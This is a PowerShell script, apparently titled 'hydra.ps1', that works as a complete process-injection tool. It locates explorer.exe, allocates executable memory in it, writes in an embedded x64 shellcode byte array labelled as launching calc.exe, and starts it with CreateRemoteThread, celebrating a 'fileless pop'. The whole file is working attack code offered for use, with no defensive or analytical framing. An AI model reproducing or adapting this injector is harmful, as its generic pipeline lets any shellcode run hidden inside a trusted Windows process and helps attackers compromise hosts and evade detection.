# =========================================================================
# OPERATIONAL 64-BIT PROCESS INJECTION ENGINE (hydra.ps1)
# Clean x64 Calc Shellcode + Explorer Injection + Balanced API Pointers
# =========================================================================

# 1. Target Phase: Lock onto the Native 64-bit Windows Explorer Process
$Target = Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1

if ($Target -eq $null) {
    Write-Host "[-] Error: explorer.exe process context not found!" -ForegroundColor Red
    exit 1
}

# Safely extract the Process ID
$TargetPID = $Target.Id

Write-Host "[*] Target Process : $($Target.ProcessName)" -ForegroundColor Cyan
Write-Host "[*] Target PID     : $TargetPID" -ForegroundColor Cyan
Write-Host "[*] PowerShell 64  : $([Environment]::Is64BitProcess)" -ForegroundColor Cyan
Write-Host "[*] OS 64-bit      : $([Environment]::Is64BitOperatingSystem)" -ForegroundColor Cyan

# Ensure we are running natively inside a 64-bit PowerShell engine
if (-not ([Environment]::Is64BitProcess)) {
    Write-Host "[-] Error: This script requires a native 64-bit PowerShell session." -ForegroundColor Red
    exit 1
}

# 2. Payload Phase: Canonical, Clean 64-bit (x64) calc.exe Shellcode
# This bytecode natively speaks 64-bit CPU instruction lanes
[byte[]] $Shellcode = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x85,0x01,0x00,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00

# 3. API Mapping Phase: Map native Win32 pointer bindings for 64-bit memory spaces
# Note: Using class name 'Win32FinalEngine' to clear any locked session states
$Signature = @"
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

if (-not ("Win32.Win32FinalEngine" -as [type])) {
    $Win32 = Add-Type -MemberDefinition $Signature -Name "Win32FinalEngine" -Namespace "Win32" -PassThru
} else {
    $Win32 = [Win32.Win32FinalEngine]
}

# 4. Phase Execution: Execute the In-Memory 64-bit Injection Pipeline
$Handle = $Win32::OpenProcess(0x1F0FFF, $false, $TargetPID)

if ($Handle -eq [IntPtr]::Zero) {
    Write-Host "[-] OpenProcess FAILED" -ForegroundColor Red
    Write-Host "    Win32 error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}
Write-Host "[+] OpenProcess successfully hooked Explorer. Handle: $Handle" -ForegroundColor Green

# Allocate Executable/Writable space (0x40 = PAGE_EXECUTE_READWRITE)
$AllocatedMemory = $Win32::VirtualAllocEx($Handle, [IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)

if ($AllocatedMemory -eq [IntPtr]::Zero) {
    Write-Host "[-] VirtualAllocEx FAILED" -ForegroundColor Red
    Write-Host "    Win32 error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}
Write-Host "[+] VirtualAllocEx carved x64 memory space at: 0x$('{0:X}' -f $AllocatedMemory.ToInt64())" -ForegroundColor Green

# Write the x64 payload array straight into the allocated region
$BytesWritten = [IntPtr]::Zero
$Success = $Win32::WriteProcessMemory($Handle, $AllocatedMemory, $Shellcode, [uint32]$Shellcode.Length, $BytesWritten)

if (-not $Success) {
    Write-Host "[-] WriteProcessMemory FAILED" -ForegroundColor Red
    Write-Host "    Win32 error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}
Write-Host "[+] WriteProcessMemory successfully staged shellcode in RAM." -ForegroundColor Green

# Trigger execution via a Remote Thread inside explorer.exe
$ThreadHandle = $Win32::CreateRemoteThread($Handle, [IntPtr]::Zero, 0, $AllocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Host "[-] CreateRemoteThread FAILED" -ForegroundColor Red
    Write-Host "    Win32 error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}

Write-Host "[+] CreateRemoteThread successfully executed! Remote Thread Handle: $ThreadHandle" -ForegroundColor Green
Write-Host "[+] Mission Complete. Witness the fileless pop!" -ForegroundColor Green
